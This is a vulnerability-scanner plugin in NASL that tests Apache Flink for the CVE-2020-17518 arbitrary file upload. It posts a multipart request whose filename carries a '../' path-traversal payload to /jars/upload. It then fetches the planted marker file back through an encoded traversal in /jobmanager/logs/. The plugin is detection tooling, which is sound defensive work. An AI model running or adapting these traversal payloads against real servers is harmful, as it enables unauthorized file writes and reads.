include("compat.inc");


if (description)
{
  script_id(51799301);
  script_version("1.3");
  script_cve_id("CVE-2020-17518");
  script_name(english:"Apache Flink any file upload");
  script_summary(english:"Apache Flink any file upload");
  script_set_attribute(attribute:"description", value:"Apache Flink any file upload.");
  script_set_attribute(attribute:"solution", value:"Apache Flink any file upload");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

ports = get_kb_list("Services/www");

pattern = "success"+hexstr(rand_str(length:8));

data = '------WebKitFormBoundaryoZ8meKnrrso89R6Y\r\nContent-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flink_upload_success"\r\n\r\n'+pattern+'\r\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--\r\n';

foreach port (ports){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	if (soc){
		res = http_send_recv3(method: "GET", port: port, item: "/", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		if("200" >< res[0] && "Apache Flink" >< res[2]){
			req = http_send_recv3(method: "POST", data:data, port: port, item: "/jars/upload", add_headers: make_array("Accept-Encoding", "gzip, deflate","Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y"));
			sleep(1);
			resp = http_send_recv3(method: "GET", port: port, item: "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflink_upload_success", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
			if("200" >< resp[0] && pattern >< resp[2]){
				security_hole(port:port, data:"/tmp/flink_upload_success:"+pattern);
			}
		}
	}
close(soc);
}